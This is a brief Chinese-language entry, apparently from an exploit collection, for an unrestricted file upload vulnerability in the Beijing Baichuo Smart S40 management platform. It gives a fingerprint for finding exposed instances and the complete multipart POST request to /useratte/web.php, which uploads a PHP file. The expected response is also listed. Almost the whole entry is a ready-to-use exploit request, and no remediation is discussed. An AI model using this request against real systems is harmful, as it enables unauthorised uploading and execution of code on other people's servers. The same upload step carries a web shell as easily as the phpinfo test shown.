# 北京百绰智能S40管理平台导入web.php无限制上传漏洞

- **系统**：北京百绰智能S40管理平台导入web.php无限制上传　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="Smart管理平台"`
- **请求**：`POST /useratte/web.php? HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=cb5c0eb7b9fabee76431aaebfadae6db`　`Content-Type: multipart/form-data; boundary=---------------------------423…`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="dudesite.php"
Content-Type: application/octet-stream
<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"
1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"
1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"
import
-----------------------------42328904123665875270630079328
```
- **预期**：200　|　—